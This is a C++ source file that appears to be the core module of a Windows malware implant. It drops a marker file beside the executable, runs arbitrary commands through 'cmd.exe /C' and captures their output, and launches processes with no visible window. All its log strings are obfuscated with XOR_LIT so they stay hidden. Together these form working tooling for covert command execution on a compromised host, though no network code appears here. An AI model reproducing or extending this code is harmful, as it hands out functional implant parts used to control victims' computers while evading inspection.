#include "core.hpp"


namespace Core {

    std::filesystem::path GetExecDir() {
        char szExePath[MAX_PATH];
        GetModuleFileNameA(GetModuleHandle(NULL), szExePath, MAX_PATH);
        std::filesystem::path exePath(szExePath);
        exePath.remove_filename();
        return exePath;
    }

    bool DropFile(std::string filename) {
        std::ofstream out(filename);
        out.close();

        if (!out) {
            DWORD error = ::GetLastError(); // call close as possible to cause of error
            std::string message = std::system_category().message(error);
            XorLogger::LogError(std::vformat(XOR_LIT("Error creating file ({}): {}"), std::make_format_args(filename, message)));
            return false;
        }

        return true;
    }

    bool DropInitialFile() {
        std::filesystem::path exeDir = GetExecDir();
        std::filesystem::path filepath = exeDir / INITIAL_FILE;

        bool dropSuccess = DropFile(filepath.string());
        if (dropSuccess) {
            Sleep(5 * 1000); // 5 seconds
        }
        return dropSuccess;
    }

    std::string cmdExecuteCommand(std::string command) {
        std::string data;
        std::array<char, 256> buffer;
        HANDLE hStdOutPipeRead = NULL;
        HANDLE hStdOutPipeWrite = NULL;

        SECURITY_ATTRIBUTES sa(sizeof(SECURITY_ATTRIBUTES), NULL, TRUE);

        // create pipe for stdout/stderr
        if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0)) {
            DWORD error = ::GetLastError();
            std::string message = std::vformat(XOR_LIT("Failed to create STDOUT named pipe. Error code: {}"), std::make_format_args(error));
            XorLogger::LogError(message);
            return message;
        }

        // ensure read handle for STDOUT not inherited
        if (!SetHandleInformation(hStdOutPipeRead, HANDLE_FLAG_INHERIT, 0)) {
            DWORD error = ::GetLastError();
            std::string message = std::vformat(XOR_LIT("Failed to set handle flag. Error code: {}"), std::make_format_args(error));
            XorLogger::LogError(message);
            return message;
        }

        // create process
        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        si.hStdError = hStdOutPipeWrite;
        si.hStdOutput = hStdOutPipeWrite;
        si.dwFlags |= STARTF_USESTDHANDLES;
        std::string cmd = XOR_LIT("cmd.exe /C ") + command;

        if (!CreateProcess(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            DWORD error = ::GetLastError();
            std::string message = std::vformat(XOR_LIT("Failed to create process: {}. Error code: {}"), std::make_format_args(command, error));
            XorLogger::LogError(message);
            return message;
        }

        // close handle
        CloseHandle(hStdOutPipeWrite);

        // read stdout/stderr from pipe
        DWORD bytesRead;
        while (ReadFile(hStdOutPipeRead, buffer.data(), buffer.size(), &bytesRead, NULL) != FALSE) {
            data.append(buffer.data(), bytesRead);
        }

        // close handles
        CloseHandle(hStdOutPipeRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return data;
    }

    DWORD SpawnProcessNoWait(LPWSTR command_line) {
        PROCESS_INFORMATION process_info; // for created process
        STARTUPINFOW startup_info; // specify how to start process
        ZeroMemory(&startup_info, sizeof(startup_info));
        startup_info.cb = sizeof(startup_info);
        if (CreateProcessW(
            NULL, // module name included in command line
            command_line,
            NULL, 
            NULL,
            FALSE, // inherit our output pipe handle
            CREATE_NO_WINDOW, // dwCreationFlags
            NULL, // use environment of calling process
            NULL, // use current dir of calling process
            &startup_info,
            &process_info
        )) {
            return ERROR_SUCCESS;
        } else {
            return GetLastError();
        }
    }
}